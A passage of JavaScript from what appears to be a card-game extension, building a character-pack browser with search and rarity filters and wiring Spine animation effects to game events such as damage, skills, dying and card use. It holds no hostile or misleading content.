            // 创建全部/热门按钮
            qy_btn_btn_bg_list.forEach(buttonType => {
                createElement({
                    class: 'qy_btn_btn_bg qy_btn_btn_bg_unsel',
                    parent: qy_btn_btn_bg_container,
                    click: function () {
                        if (__qy_btn_btn_current === this) return;
                        if (__qy_btn_btn_current) {
                            __qy_btn_btn_current.classList.remove('qy_btn_btn_bg_sel', 'qy_btn_btn_bg2_sel');
                        }
                        __qy_btn_btn_current = this;
                        this.classList.add('qy_btn_btn_bg_sel');
                        qy_chess_pack_switch.style.display = 'none';

                        if (buttonType === '全部') {
                            generatorCharacter(allCharacter, this);
                        } else {
                            const favouriteCharacters = lib.config.favouriteCharacter?.map(characterID => get.character(characterID)) || [];
                            generatorCharacter(favouriteCharacters, this);
                        }
                    },
                    children: [
                        {
                            innerHTML: buttonType
                        },
                        {
                            innerHTML: buttonType === '全部'
                                ? `${Object.keys(lib.character).length}/${Object.keys(allCharacter).length}`
                                : '0/0'
                        }
                    ]
                });
            });

            // 武将包按钮容器
            const qy_pbtn_btn_bg2_container = createElement({
                class: 'qy_pbtn_btn_bg2_container',
                parent: qy_btn_btn_left_container
            });

            // 武将包按钮点击事件
            function qy_pbtn_btn_bg2_click(event) {
                event.stopPropagation();
                if (__qy_btn_btn_current === this) return;

                if (__qy_btn_btn_current) {
                    __qy_btn_btn_current.classList.remove('qy_btn_btn_bg2_sel', 'qy_btn_btn_bg_sel');
                }
                __qy_btn_btn_current = this;
                this.classList.add('qy_btn_btn_bg2_sel');

                // 更新开关按钮状态
                if (qy_chess_pack_switch) {
                    qy_chess_pack_switch.style.display = 'block';
                    const isEnabled = lib.config.characters.contains(__qy_btn_btn_current.link);
                    qy_chess_pack_switch.classList.toggle('qy_chess_pack_switch_on', isEnabled);
                    qy_chess_pack_switch.innerHTML = isEnabled ? '开启' : '关闭';
                    qy_chess_pack_switch.classList.toggle('qy_pbtn_btn_bg2_off', !isEnabled);
                }

                const characterPackElement = lib.characterPack[this.link];
                if (characterPackElement) {
                    generatorCharacter(characterPackElement, this);
                }
            }

            // 创建武将包按钮
            const characterPackList = Object.keys(lib.characterPack).sort((a, b) => {
                if (a === '假装无敌Pack') return -100;
                const aIndex = lib.config.all.characters.indexOf(a);
                const bIndex = lib.config.all.characters.indexOf(b);
                const result = aIndex - bIndex;
                return result < -9 ? 1 : (result > 0 ? 1 : -1);
            });

            characterPackList.forEach(packName => {
                const isEnabled = lib.config.characters.contains(packName);
                createElement({
                    class: `qy_pbtn_btn_bg2 qy_btn_btn_bg2_unsel${isEnabled ? '' : ' qy_pbtn_btn_bg2_off'}`,
                    parent: qy_pbtn_btn_bg2_container,
                    click: qy_pbtn_btn_bg2_click,
                    props: { link: packName },
                    children: [{
                        innerHTML: get.translation(`${packName}_character_config`)
                    }]
                });
            });

            /** **************************** 构造左边的武将包信息 --- end --- *****************************/

            /** ++++++++++++++++++++++++++++ 构造右边的武将包信息 --- start --- ++++++++++++++++++++++++++++*/

            // 过滤条件：按势力筛选
            filterFunction.push(character => {
                if (!__qy_right_group_current) return true;
                return character.group === __qy_right_group_current.link;
            });

            // 势力按钮点击事件
            function qy_right_group_click(event) {
                event.stopPropagation();
                try {
                    if (__qy_right_group_current) {
                        __qy_right_group_current.classList.remove('qy_publicui_tab1_bg_sel');
                    }
                    if (__qy_right_group_current === this) {
                        __qy_right_group_current = null;
                    } else {
                        this.classList.add('qy_publicui_tab1_bg_sel');
                        __qy_right_group_current = this;
                    }
                } finally {
                    if (virtualScroll) {
                        virtualScroll.refresh();
                    }
                }
            }

            // 生成势力分组
            const generatorGroup = function (groupMapNum) {
                __qy_right_group_current = null;
                if (__qy_chess_right_container) {
                    __qy_chess_right_container.remove();
                }

                __qy_chess_right_container = createElement({
                    class: 'qy_chess_right_container',
                    parent: qy_chess_container
                });

                Object.keys(groupMapNum).forEach(group => {
                    createElement({
                        class: 'qy_publicui_tab1_bg',
                        parent: __qy_chess_right_container,
                        click: qy_right_group_click,
                        props: { link: group },
                        children: [
                            { innerHTML: get.translation(group) },
                            { innerHTML: `${groupMapNum[group]}/${groupMapNum[group]}` }
                        ]
                    });
                });
                searchCharacter();
            };

            /** ++++++++++++++++++++++++++++ 构造右边的武将包信息 --- end --- ++++++++++++++++++++++++++++*/

            // 武将生成函数 - 使用虚拟滚动替代原来的 qyTicker 方法
            function generatorCharacter(characterPackElement, node) {
                const groupMapNum = {};
                
                for (const i of Object.keys(characterPackElement)) {
                    const character = characterPackElement[i];
                    if (!character) continue;

                    const group = character[1];
                    if (Array.isArray(character[4]) && character[4].includes('unseen')) continue;

                    if (!groupMapNum.hasOwnProperty(group) || !isFinite(groupMapNum[group])) {
                        groupMapNum[group] = 0;
                    }
                    groupMapNum[group]++;
                }

                generatorCharacterContainer(characterPackElement, node);
                generatorGroup(groupMapNum);
            }

            // 生成武将容器 - 使用虚拟滚动替代原来的方法
            function generatorCharacterContainer(characterPack, node) {
                // 销毁之前的虚拟滚动实例
                if (virtualScroll) {
                    virtualScroll.destroy();
                }

                // 移除旧容器
                if (__qy_pub_character_container) {
                    qy_chess_container.removeChild(__qy_pub_character_container);
                }

                // 创建新的容器
                __qy_pub_character_container = createElement({
                    class: 'qy_pub_character_container',
                    parent: qy_chess_container
                });

                // 创建虚拟滚动实例
                virtualScroll = new VirtualCharacterScroll(__qy_pub_character_container, {
                    buffer: 3,
                    gap: 15,
                    estimatedItemWidth: 140,
                    estimatedItemHeight: 200
                });

                // 设置过滤函数
                virtualScroll.clearFilterFunctions();
                filterFunction.forEach(filterFn => {
                    virtualScroll.addFilterFunction(filterFn);
                });

                // 设置数据
                virtualScroll.setData(characterPack);
            }

            // 搜索武将 - 适配虚拟滚动
            function searchCharacter() {
                if (virtualScroll) {
                    virtualScroll.refresh();
                }
            }

            /* ~~~~~~~~~~~~~~~~~~~~~~~~~~ 开关按钮 start ~~~~~~~~~~~~~~~~~~~~~~~~~~ */
            const qy_chess_top_left_container = createElement({
                class: 'qy_chess_top_left_container',
                parent: qy_chess_container
            });

            const qy_chess_pack_switch = createElement({
                class: 'qy_chess_pack_switch qy_chess_pack_switch_on',
                innerHTML: '开启',
                parent: qy_chess_top_left_container,
                click: function (event) {
                    event.stopPropagation();
                    if (!__qy_btn_btn_current || !__qy_btn_btn_current.link) return;

                    this.classList.toggle('qy_chess_pack_switch_on');
                    const isEnabled = this.classList.contains('qy_chess_pack_switch_on');
                    __qy_btn_btn_current.classList.toggle('qy_pbtn_btn_bg2_off', !isEnabled);

                    if (isEnabled) {
                        lib.config.characters.add(__qy_btn_btn_current.link);
                        this.innerHTML = '开启';
                    } else {
                        lib.config.characters.remove(__qy_btn_btn_current.link);
                        this.innerHTML = '关闭';
                    }
                    game.saveConfigValue('characters');
                }
            });
            /* ~~~~~~~~~~~~~~~~~~~~~~~~~~ 开关按钮 end ~~~~~~~~~~~~~~~~~~~~~~~~~~ */

            /** ............................ 构造头部按钮 --- start --- ................................. */
            const qy_chess_top_right_container = createElement({
                class: 'qy_chess_top_right_container',
                parent: qy_chess_container
            });

            // 右上角返回按钮
            createElement({
                class: 'qy_btn_btn_back_button',
                parent: qy_chess_top_right_container,
                click: function (event) {
                    event.stopPropagation();
                    if (virtualScroll) {
                        virtualScroll.destroy();
                    }
                    qy_chess_container.delete(500);
                }
            });

            // 搜索容器
            const qy_pub_background_search_container = createElement({
                class: 'qy_pub_background_s1 qy_pub_background_s1_search',
                parent: qy_chess_top_right_container
            });

            // 搜索输入框
            const searchInput = createElement({
                tag: 'input',
                parent: qy_pub_background_search_container,
                attributes: { placeholder: '搜索' },
                event: {
                    keydown: event => event.stopPropagation(),
                    input: searchCharacter
                }
            });

            // 搜索条件
            filterFunction.push(character => {
                if (!searchInput.value) return true;
                const characterName = get.translation(character.name);
                return characterName.includes(searchInput.value) || character.name.includes(searchInput.value);
            });

            // 搜索按钮
            createElement({
                class: 'qy_warr_search_btn',
                parent: qy_pub_background_search_container,
                click: searchCharacter
            });

            // 下拉分类
            let qy_pub_background_group_current_value = null;

            const qy_pub_background_group_container = createElement({
                class: 'qy_pub_background_s1',
                parent: qy_chess_top_right_container,
                click: function (event) {
                    event.stopPropagation();
                    this.classList.toggle('qy_pub_background_s1_activ');
                }
            });

            const qy_pub_background_s1_text_container = createElement({
                class: 'qy_pub_background_s1_text_container',
                parent: qy_pub_background_group_container
            });

            const qy_pub_background_s1_options_list = [
                { label: '全部', value: 'all' },
                { label: '传说', value: 'legend' },
                { label: '史诗', value: 'epic' },
                { label: '精品', value: 'rare' },
                { label: '普通', value: 'common' },
                { label: '平凡', value: 'junk' }
            ];

            const title = createElement({
                class: 'qy_pub_background_s1_text',
                innerHTML: '全部武将',
                parent: qy_pub_background_s1_text_container
            });

            createElement({
                class: 'qy_pub_background_s1_triangle',
                parent: qy_pub_background_s1_text_container
            });

            const qy_pub_background_s1_option_container = createElement({
                class: 'qy_pub_background_s1_option_container',
                parent: qy_pub_background_group_container
            });

            // 过滤条件：按稀有度筛选
            filterFunction.push(character => {
                if (!qy_pub_background_group_current_value || qy_pub_background_group_current_value === 'all') {
                    return true;
                }
                if (!lib.rank) return true;
                return game.getRarity(character.name) === qy_pub_background_group_current_value;
            });

            // 创建下拉选项
            qy_pub_background_s1_options_list.forEach(item => {
                const option = createElement({
                    class: 'qy_pub_background_s1_option',
                    innerHTML: item.label + '武将',
                    parent: qy_pub_background_s1_option_container,
                    props: { link: item.value },
                    click: function (event) {
                        title.textContent = item.label + '武将';
                        qy_pub_background_group_current_value = item.value;
                        searchCharacter();
                    }
                });
            });

            // 设置下拉容器高度
            lib.qyUtils.css(qy_pub_background_s1_option_container, {
                height: qy_pub_background_s1_option_container.offsetHeight + 'px'
            });

            qy_pub_background_group_container.classList.add('qy_pub_background_s1_activ');
            /** ............................ 构造头部按钮 --- end --- ................................. */

            // 模拟点击第一个武将包按钮
            requestAnimationFrame(() => {
                const firstPackButton = qy_pbtn_btn_bg2_container.firstElementChild;
                if (firstPackButton) {
                    firstPackButton.click();
                }
            });

            return qy_chess_container;
        };
        lib.clickCharacter = clickCharacter;
        const cover = function () {
            if (!ui.menuContainer) return false;
            const menuTab = ui.menuContainer.querySelector('.menu-tab');
            if (!menuTab) return false;
            const childNodeList = Array.from(menuTab.children);
            const characterTab = childNodeList[childNodeList.findIndex(item => item.textContent === '武将')];
            if (!characterTab) return false;
            if (displayMode === 'cover') {
                characterTab._link = clickCharacter();
            } else {
                characterTab.addEventListener(lib.config.touchscreen ? 'touchend' : 'click', event => {
                    clickCharacter(document.body);
                }, true);
            }
            return true;
        }
        const requestCover = function () {
            const request = () => {
                if (!cover()) requestAnimationFrame(request);
            };
            requestAnimationFrame(request);
        };
        requestCover();
    })

    // 特效相关
    lib.qyArenaReadyPushOrRunStart(() => {
        // if(!config.qyCardAnimate) {
        //     config.qyCardAnimate = {};
        //     game.saveExtensionConfig('假装无敌', 'qyCardAnimate', {})
        // }
        // 初始化设置
        const initQyPlayerAnimateConfig = {
            tiesuo: true,
            jiu: true,
            fuhuo: true,
            jinlong: true,
            chuxian: true,
            lianzhan: true,
            shoushang: 'qy_fuzi',
            name: true,
            guohe: true,
            logSkill: 'jinengX',
            zhuanhuanji: true,
            dying: true,
            chupaizhishiX: true,
            fireThunderDamage: true,
            wuxie: true,
        }

        if (!config.qyPlayerAnimate || typeof config.qyPlayerAnimate !== 'object') {
            config.qyPlayerAnimate = {};
            game.saveExtensionConfig('假装无敌', 'qyPlayerAnimate', initQyPlayerAnimateConfig)
        }
        for (const configKey in initQyPlayerAnimateConfig) {
            if (config.qyPlayerAnimate.hasOwnProperty(configKey)) continue;
            config.qyPlayerAnimate[configKey] = initQyPlayerAnimateConfig[configKey];
            game.saveExtensionConfig('假装无敌', 'qyPlayerAnimate', config.qyPlayerAnimate);
        }

        if (!game.getExtensionConfig('假装无敌', 'qingyao_character_animation')) return;
        // 复活
        if (config.qyPlayerAnimate.fuhuo) {
            const playerRevive = lib.element.player.revive;
            lib.element.player.revive = function (hp, log) {
                JzwdWebWorkerOrMainWorker(lib.qyPlayerApp, 'qy_aar_huanhua_fuhuo', {
                    parent: this,
                    skeScale: [0.7, 0.8],
                })
                return playerRevive.apply(this, arguments);
            }
        }
        // 指示
        if (config.qyPlayerAnimate.chupaizhishiX) {
            lib.element.player.inits = [].concat(lib.element.player.inits || [])
                .concat(player => {
                    if (player.qyChupaizhishiXObserver) return;
                    const qyChupaizhishiX = {attributes: true, attributeFilter: ['class']};
                    let timer = null;
                    const qyChupaizhishiXObserver = new globalThis.MutationObserver(mutationRecords => {
                        for (let mutationRecord of mutationRecords) {
                            if (mutationRecord.attributeName !== 'class') continue;
                            const targetElemen = mutationRecord.target;
                            if (targetElemen.classList.contains('selectable')) {
                                if (!targetElemen.qyChupaizhishiXUUID) {
                                    targetElemen.qyChupaizhishiXUUID = window.qyAnimationUtil.generatorUUID();
                                    if (timer) return;
                                    // 宁可多放也不能遗留播放动画
                                    timer = setTimeout(() => {
                                        JzwdWebWorkerOrMainWorker(lib.qyPlayerApp, 'aar_chupaizhishiX', {
                                            parent: targetElemen,
                                            skeScale: 0.6,
                                            skeX: [10],
                                            loop: true,
                                        }, targetElemen.qyChupaizhishiXUUID)
                                        timer = null;
                                    }, 300);
                                }
                            } else {
                                if (targetElemen.qyChupaizhishiXUUID) {
                                    JzwdWebWorkerDestroySpine(targetElemen.qyChupaizhishiXUUID);
                                    delete targetElemen.qyChupaizhishiXUUID;
                                    if (timer) {
                                        clearTimeout(timer)
                                        timer = null;
                                    }
                                }
                            }
                        }
                    });
                    qyChupaizhishiXObserver.observe(player, qyChupaizhishiX);
                    player.qyChupaizhishiXObserver = qyChupaizhishiXObserver;
                })
        }

        /**
         * 检测并使用特效
         * @param useList 特效集合
         * @param trigger 时机
         * @param player 触发时机的武将
         * @param arg 自定义参数
         */
        lib.qycheckAndUseAnimation = function (useList, trigger, player, arg) {
            for (let useListElement of useList) {
                // 检测开关
                const extensionConfig = lib.qyUtils.getConfig('qyPlayerAnimate', {});
                if (useListElement.configEnableNotEquals) {
                    if (extensionConfig[useListElement.configEnable] === useListElement.configEnableNotEquals) continue;
                } else if (useListElement.hasOwnProperty('configEnable') && !extensionConfig[useListElement.configEnable]) {
                    continue;
                }
                // 是否可以触发特效
                if (useListElement.filter && !useListElement.filter(trigger, player, arg)) continue;
                // 是否为自己发动，而不是代理发送
                if (typeof useListElement.content === 'function') {
                    useListElement.content(trigger, player, arg);
                    continue;
                }
                // 代理播放
                const spine = useListElement.spine;
                if (!spine) continue;
                if (!spine.position) spine.position = {};
                const position = Object.assign({}, spine.position);
                if (typeof position.parent === 'string') position.parent = eval(`(${spine.position.parent})`);
                // 使用Worker线程播放，保证特效和游戏的流畅度！！！
                JzwdWebWorkerOrMainWorker(lib.qyPlayerApp, spine.name, position);
            }
        }

        /**
         *
         * @type {[{configEnable:str,filter: filter, content: content}]}
         * configEnable:game.getExtensionConfig('假装无敌'，'qyPlayerAnimate')[configEnable]
         * configEnableNotEquals: 不等于，默认为undefied，即为 '真'
         * filter过滤条件，是否满足发动条件
         * content: 自定义内容，如果有此选项，那么spine将无效化
         */
        lib.damageAnimateList = [
            {
                label: '受伤特效',
                configEnable: 'shoushang',
                configEnableNotEquals: 'off',
                filter: (trigger, player, card) => {
                    return trigger.source;
                },
                content: (trigger, player, card) => {
                    let playName = game.getExtensionConfig('假装无敌', 'qyPlayerAnimate').shoushang || 'qy_fuzi';
                    let skeScale = 0.7;
                    if (playName === 'qy_jian') skeScale = 0.6;
                    // 雷属性伤害
                    if (trigger.nature === 'thunder' && playName == 'qy_fuzi') {
                        playName = ['lei_daojianfu', 'play3']
                        if (trigger.num > 1) {
                            playName[1] = 'play4'
                            skeScale = 0.8
                        }
                    } else if (trigger.nature === 'fire') {
                        let spinPlayName = playName;
                        if (spinPlayName === 'qy_dao') {
                            skeScale = 0.5
                            playName = ['huo_daojianfu', 'play']
                            if (trigger.num > 1) {
                                playName[1] = 'play2';
                            }
                        } else if (spinPlayName === 'qy_fuzi') {
                            skeScale = 0.6
                            playName = ['huo_daojianfu', 'play3'];
                            if (trigger.num > 1) {
                                playName[1] = 'play4';
                                skeScale = 0.5
                            }
                        } else {
                            skeScale = 0.5
                            playName = ['huo_daojianfu', 'play5'];
                            if (trigger.num > 1) {
                                playName[1] = 'play6';
                            }
                        }
                    }


                    JzwdWebWorkerOrMainWorker(lib.qyPlayerApp, playName, {
                        parent: player,
                        skeScale: skeScale
                    });
                },
            },
            {
                label: '火伤特效',
                configEnable: 'fireThunderDamage',
                filter: (trigger, player, card) => {
                    return trigger.nature === 'fire' && trigger.num > 1
                },
                spine: {
                    name: 'fire',
                    position: {
                        parent: 'player',
                    },
                },
            },
            {
                label: '雷伤特效',
                configEnable: 'fireThunderDamage',
                filter: (trigger, player, card) => {
                    return trigger.nature === 'thunder' && trigger.num > 1
                },
                spine: {
                    name: 'tx1',
                    position: {
                        parent: 'player',
                        skeScale: 0.6,
                    },
                },
            },
        ]
        lib.useLogSkillAnimateList = [
            {
                label: '发动技能特效',
                configEnable: 'logSkill',
                filter: (trigger, player, name) => {
                    return player.getSkills(true, true, false).some(item => [trigger.sourceSkill, name].contains(item));
                },
                configEnableNotEquals: 'off',
                content: function (trigger, player, name) {
                    const spine = game.getExtensionConfig('假装无敌', 'qyPlayerAnimate').logSkill || 'jinengX';
                    let poinstion = {
                        parent: player,
                    };
                    switch (spine) {
                        case 'jineng':
                            Object.assign(poinstion, {
                                skeX: [-150],
                                skeY: [150],
                            });
                            break;
                        case 'jinengXX':
                            Object.assign(poinstion, {
                                speed: 2,
                                skeX: [-15]
                            })
                            break;
                        default:
                            break;
                    }
                    JzwdWebWorkerOrMainWorker(lib.qyPlayerApp, spine, poinstion);
                },
            },
            {
                label: '转换技',
                configEnable: 'zhuanhuanji',
                filter: function (trigger, player, name) {
                    const info = lib.skill[name];
                    const sourceInfo = lib.skill[name];
                    return (info && info.zhuanhuanji) || (sourceInfo && sourceInfo.zhuanhuanji);
                },
                spine: {
                    name: 'YinYangjinengzhuanhuan',
                    position: {
                        skeScale: 0.7,
                        parent: 'player',
                        skeY: [-10],
                    },
                },
            },
            {
                label: '使命技成功',
                configEnable: 'dutyAchieve',
                filter: (trigger, player, name) => {
                    if (!player.getSkills(true, true, false).some(item => [trigger.sourceSkill, name].contains(item))) return false;
                    const skill = lib.skill[name]
                    const sourceSKill = lib.skill[trigger.sourceSkill];
                    return (skill && skill.shimingji === true) || (sourceSKill && sourceSKill.shimingji === true)
                },
                spine: {
                    name: 'aar_huanhua_renwuchenggong',
                    position: {
                        skeScale: 0.78,
                        skeY: [-8],
                        parent: 'player',
                    },
                },
            },
            {
                label: '使命技失败',
                configEnable: 'dutyFail',
                filter: (trigger, player, name) => {
                    if (!player.getSkills(true, true, false).some(item => [trigger.sourceSkill, name].contains(item))) return false;

                    function isDutyFail(skillName) {
                        if (typeof skillName !== 'string') return false;
                        const spilt = skillName.split('_');
                        if (spilt.length < 1) return false;
                        const dutyInfo = lib.skill[spilt[0]]
                        return dutyInfo && dutyInfo.dutySkill
                    }

                    return isDutyFail(name) || isDutyFail(trigger.sourceSkill);
                },
                spine: {
                    name: 'aar_huanhua_baohushibai',
                    position: {
                        skeScale: 0.78,
                        parent: 'player',
                    },
                },
            }
        ]

        // 特效
        lib.skill._qyPlayerAnimateFilterUse = {
            trigger: {
                player: ['changeHp', 'logSkill', 'useSkillBegin'],
            },
            filter: lib.filter.all,
            firstDo: true,
            forced: true,
            priority: 97,
            forceDie: true,
            popup: false,
            silent: true,
            // multitarget: true,
            content: function () {
                let useList = [];
                let arg = null;
                switch (event.triggername) {
                    case "changeHp":
                        if (!trigger.getParent() || trigger.getParent().name != 'damage') return;
                        const parent = trigger.getParent();
                        useList = lib.damageAnimateList;
                        arg = parent.card;
                        lib.qycheckAndUseAnimation(useList, parent, player, arg);
                        return;
                        break;
                    case "logSkill":
                    case "useSkillBegin":
                        useList = lib.useLogSkillAnimateList;
                        arg = trigger.skill;
                        break;
                    default:
                        console.error(event.triggername, "没有该时机的特效 忽略。。。");
                        return;
                }
                // 使用这些特效
                lib.qycheckAndUseAnimation(useList, trigger, player, arg);
            }
        }


        // 为自定义绑定特效做的铺垫
        lib.qyTriggerAnimateList = [
            {
                lebel: '过河拆桥',
                trigger: {
                    player: ['useCardToBegin']
                },
                configEnable: 'guohe',
                filter: (trigger, player, card) => {
                    return trigger.card && get.name(trigger.card) === 'guohe'
                },
                content: function (trigger, player, card) {
                    game.playqysstx('audio/guohechaiqiao.mp3')
                    const uuid = qyAnimationUtil.generatorUUID();
                    JzwdWebWorkerOrMainWorker(lib.qyPlayerApp, ['zizouqi_guohechaiqiao'], {
                        parent: trigger.target,
                        qiaoUUid: uuid,
                        event: {
                            start: function () {
                                this.addAnimation('zizouqi_guohechaiqiao_futou2')
                            },
                            end: function () {
                                const qiao = qyAnimationUtil.getSpineById(this.position.qiaoUUid);
                                qiao && qiao.changeAnimation('zizouqi_guohechaiqiao_qiao2', false);
                            },
                        },
                        loopCount: 2
                    })

                    JzwdWebWorkerOrMainWorker(lib.qyPlayerApp, ['zizouqi_guohechaiqiao', 'zizouqi_guohechaiqiao_qiao'], {
                        parent: trigger.target,
                        skeScale: 0.5,
                        loopCount: 1,
                    }, uuid);
                },
            },

            {
                label: '濒死救我',
                configEnable: 'dying',
                trigger: {
                    player: ['dying', 'dyingAfter', 'dieBefore', 'die']
                },
                content: function (trigger, player, event) {
                    // 防止结束游戏的关键角色死亡还播放特效
                    if (player.__qyDyingUUID) {
                        JzwdWebWorkerDestroySpine(player.__qyDyingUUID)
                        delete player.__qyDyingUUID
                        return;
                    }
                    // 濒死状态
                    if (player.isDying()) {
                        player.__qyDyingUUID = window.qyAnimationUtil.generatorUUID();
                        JzwdWebWorkerOrMainWorker(lib.qyPlayerApp, 'Xjiuwo', {
                            parent: player,
                            loop: true,
                            skeScale: [0.75, 0.8],
                            skeX: [1],
                            follow: true,
                        }, player.__qyDyingUUID)
                    }
                },
            },
            {
                label: '武将框',
                trigger: {
                    global: 'gameDrawAfter'
                },
                configEnable: 'chuxian',
                content: function (trigger, player, event) {
                    setTimeout(() => {
                        JzwdWebWorkerOrMainWorker(lib.qyPlayerApp, 'qy_aar_huanhua_shuaxin', {
                            skeScale: 0.8,
                            parent: player,
                            autoDestroy: true
                        });
                    }, get.mode() === 'boss' ? 500 : 0);
                },
            },
            {
                label: '金龙旋框',
                trigger: {
                    global: 'gameDrawAfter'
                },
                configEnable: 'jinlong',
                filter: (trigger, player, event) => player === game.me,
                content: function (trigger, player, event) {
                    setTimeout(() => {
                        JzwdWebWorkerOrMainWorker(lib.qyPlayerApp, 'qy_Ss_BiaoQing_JinLong2', {
                            skeScale: 0.8,
                            parent: game.me,
                            loop: true,
                            event: {
                                start: track => {
                                    track.animationEnd = 3.8
                                },
                                complete: track => {
                                    track.animationStart = 1.2
                                }
                            },
                        });
                    }, get.mode() === 'boss' ? 600 : 100);
                },
            },
            {
                label: '无懈可击特效',
                trigger: {
                    player: '_wuxieAfter',
                },
                filter: (trigger, player, event) => trigger.stateplayer !== undefined && trigger.statecard !== undefined,
                configEnable: 'wuxie',
                content: function (trigger, player, event) {
                    const target = trigger.getTrigger().name === "phaseJudge" ? trigger.player : trigger.target;
                    const spine = trigger.state ? ["zzq_wxkj", "play2"] : "zzq_wxkj";

                    JzwdWebWorkerOrMainWorker(lib.qyPlayerApp, spine, {
                        skeScale: 0.8,
                        parent: target,
                    });
                },
            },
            {
                trigger: {
                    player: 'useCardToTargeted'
                },
                configEnable: 'jiu',
                filter: function (trigger, player, event) {
                    return trigger.card && (get.name(trigger.card) === 'jiu' || get.name(trigger.card) === 'tianxianjiu')
                },
                content: function (trigger, player, event) {
                    const target = trigger.target;
                    if (target.node.qyUseJiu) {
                        JzwdWebWorkerDestroySpine(target.node.qyUseJiu);
                        delete target.node.qyUseJiu;
                    }
                    target.addSkill('qy_use_jiu',false,false,false,true);
                    if (target.isDying()) {
                        JzwdWebWorkerOrMainWorker(lib.qytargetApp, ['qy_zzq_jiu', 'zzq_jiu_jiaxue'], {
                            skeScale: [0.76, 0.9],
                            skeX: [-3],
                            parent: target,
                        });
                    } else {
                        target.node.qyUseJiu = qyAnimationUtil.generatorUUID();
                        // 喝酒特效
                        JzwdWebWorkerOrMainWorker(lib.qytargetApp, 'qy_zzq_jiu', {
                            skeScale: lib.config.extension_十周年UI_enable ? 0.9 : 0.8,
                            skeX: [-3],
                            loop: true,
                            parent: target,
                            event: {
                                complete: function () {
                                    if (this.currentAnimation != 'zzq_jiu_huo2') {
                                        this.changeAnimation('zzq_jiu_huo2');
                                    }
                                },
                            }
                        }, target.node.qyUseJiu)
                    }
                },
            }
        ];
        // 自定义的一些特效
        let triggerCustom = {};
        for (const animateElement of lib.qyTriggerAnimateList) {
            for (const triggerKey in animateElement.trigger) {
                const triggerValue = animateElement.trigger[triggerKey];
                if (!triggerCustom[triggerKey]) triggerCustom[triggerKey] = [];
                triggerCustom[triggerKey] = Array.from(new Set(triggerCustom[triggerKey].concat(triggerValue)));
            }
        }

        lib.skill._qyCustomAnimationList = {
            trigger: triggerCustom,
            filter: lib.filter.all,
            firstDo: true,
            forced: true,
            priority: 97,
            forceDie: true,
            popup: false,
            silent: true,
            content: function () {
                let useList = [];
                // 开始筛选本时机的特效
                for (const animateElement of lib.qyTriggerAnimateList) {
                    let isSkipCurrent = true;
                    for (const triggerKey in animateElement.trigger) {
                        const triggerValue = animateElement.trigger[triggerKey];
                        if ([].concat(triggerValue).includes(event.triggername)) {
                            isSkipCurrent = false;
                            break;
                        }
                    }
                    // 证明未包括该时机，忽略。。。
                    if (isSkipCurrent) continue;
                    useList.push(animateElement);
                }
                // 一般是不会检索不出来的。。。
                if (!useList.length) return;
                // 使用这些特效
                lib.qycheckAndUseAnimation(useList, trigger, player, event);
            },
        }
        /**
         * @param card:string 卡牌实体
         * @param name:string 卡牌名称
         * @param nature:string 字体属性
         * @param popname:boole 是否显示名称
         * @this player 触发这个卡牌的玩家
         */
        // lib.animate.card['卡牌名称']
        if (config.qyPlayerAnimate.jiu) {
            // 卡牌使用
            lib.skill.qy_use_jiu = {
                trigger: {player: 'useCard1'},
                filter: function (event) {
                    return event.card && event.card.name == 'sha';
                },
                temp: true,
                vanish: true,
                silent: true,
                popup: false,
                nopop: true,
                forced: true,
                charlotte: true,
                firstDo: true,
                onremove: player => {
                    if (player.node.qyUseJiu) {
                        JzwdWebWorkerDestroySpine(player.node.qyUseJiu);
                        player.node.qyUseJiu = null;
                    }
                },
                content: function () {
                    if (player.node.qyUseJiu) {
                        JzwdWebWorkerDestroySpine(player.node.qyUseJiu);
                        player.node.qyUseJiu = null;
                    }
                    player.removeSkill('qy_use_jiu');
                },
                group: ['qy_use_jiu2'],
            }
            lib.skill.qy_use_jiu2 = {
                trigger: {player: 'useCardAfter', global: 'phaseAfter'},
                priority: 2,
                firstDo: true,
                charlotte: true,
                filter: function (event) {
                    if (event.name == 'useCard') return event.card && get.name(event.card) === 'sha';
                    return true;
                },
                forced: true,
                popup: false,
                audio: false,
                content: function () {
                    player.removeSkill('qy_use_jiu');
                },
            }
        }

        lib.skill['_qy_tiesuo_suo'] = {
            trigger: {
                player: 'linkBefore',
            },
            filter: function (event, player) {
                var tiesuoConfig = game.getExtensionConfig('假装无敌', 'qyPlayerAnimate').tiesuo;
                return event.player === player && tiesuoConfig;
            },
            forced: true,
            content: function () {
                let config = ['qy_tiesuolianhuan', 'play5'];
                const options = {
                    skeScale: 0.58,
                    skeX: [-5],
                    skeY: [lib.config.extension_十周年UI_enable ? -5 : 0],
                    parent: player,
                }

                if (player.isLinked()) {
                    player.classList.add('qyLinkHide')
                    let parent = _status.event.getParent('damage');
                    if (parent && parent.nature) {
                        if (parent.nature === 'fire') {
                            config[1] = 'play2';
                        } else if (parent.nature === 'thunder') {
                            config[1] = 'play3';
                        }
                    } else {
                        config[1] = 'play5';
                    }
                    JzwdWebWorkerOrMainWorker(lib.qyPlayerApp, config, options);
                    setTimeout(() => {
                        player.classList.remove('qyLinkHide');
                    }, 1000);
                } else {
                    player.classList.add('qyLinkHide');
                    config[1] = 'play1'
                    JzwdWebWorkerOrMainWorker(lib.qyPlayerApp, config, Object.assign(options, {
                        loopCount: 2,
                        event: {
                            complete: function (track) {
                                this.stopAnimation();
                                if (this.currentAnimation != 'play4') {
                                    this.changeAnimation('play4', false);
                                } else {
                                    this.destroySpine();
                                }
                            }
                        },
                    }));

                    setTimeout(() => {
                        player.classList.remove('qyLinkHide');
                    }, 2000)
                }
            },
        }
    })


    "use strict";
    if (!window.zyile_dragZoom) {
        /**
         * 拖动元素和缩放
         * @param element 元素，必须是HTMLElement
         * @param body 父级框，默认为元素的上级节点
         * @param Tran 是否<font color='red'>不启用</font>transform, 默认false 使用transform
         * @param XZ 是否控制在父级元素里面，不让拖动移除，默认false 不可以拖出去
         * @param isImp 是否用!important修饰，不可被覆盖，默认false
         * @param isZoom 是否启用缩放 width、hegiht
         */
        window.zyile_dragZoom = function zyile_dragZoom(element, body, Tran, XZ, isImp, isZoom) {
            var disX = 0,
                disY = 0,
                area,
                contains = body || element.parentNode || document.body,
                isTouch = false, types = ['mousedown', 'mousemove', 'mouseup'], dragtouche,
                TranLeT = function (iT, iL, b) {
                    if (isNaN(iT) || isNaN(iL)) return;
                    if (!Tran) {
                        var translate = element._translate.slice(0);
                        if (b) translate = element._translate;
                        translate[0] += iL;
                        translate[1] += iT;
                        if (!XZ) {
                            if (translate[1] + element.offsetTop + element.offsetHeight > contains.offsetHeight) {
                                translate[1] = contains.offsetHeight - (element.offsetTop + element.offsetHeight);
